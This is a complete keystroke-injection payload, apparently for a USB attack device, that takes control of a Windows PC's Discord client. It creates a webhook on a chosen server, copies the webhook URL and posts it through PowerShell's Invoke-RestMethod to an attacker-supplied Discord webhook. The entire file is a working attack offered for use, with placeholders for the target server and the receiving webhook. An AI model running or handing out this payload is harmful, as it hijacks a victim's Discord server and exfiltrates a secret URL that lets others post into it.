* ###############################################################
* #                                                             |
* # Title        : Create And Exfiltrate A Webhook Of Discord   |
* # Author       : Aleff                                        |
* # Version      : 1.0                                          |
* # Category     : Exfiltration                                 |
* # Target       : Windows 10-11                                |
* #                                                             |
* ###############################################################


* Requirements:
*     - Internet connection
*     - Discord Installed


* Open Discord app
GUI
DELAY 1000
STRING Discord
ENTER

* It depends
DELAY 6000

* Search by Discord keyboard shortcut and open it
CTRL k
DELAY 500

* You must define the Discord server name i.e. Hak5
STRING *SERVER_NAME
ENTER
DELAY 500

* Go to first channel and open the settings
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
ENTER
DELAY 500

* Open Integrations section
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
DOWN_ARROW
DELAY 500
DOWN_ARROW
DELAY 500
DOWN_ARROW
DELAY 500
ENTER
DELAY 500

* Webhooks settings
TAB
DELAY 500
TAB
DELAY 500
ENTER

* Create Webhook
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
ENTER
DELAY 500

* Select first Webhook
TAB
DELAY 500
ENTER
DELAY 500

* Copy Webhook
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
SPACE
DELAY 500

* Close Discord
ALT F4

* Open a PowerShell
DELAY 500
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 2000

* You must define your Discord webhook if you want to use this method for the exfiltration
STRING $WebhookUrl = "#DISCORD_WEBHOOK"
ENTER

STRING $Payload = @{content = "
CTRL v
STRING "} | ConvertTo-Json
ENTER

STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'; exit;
ENTER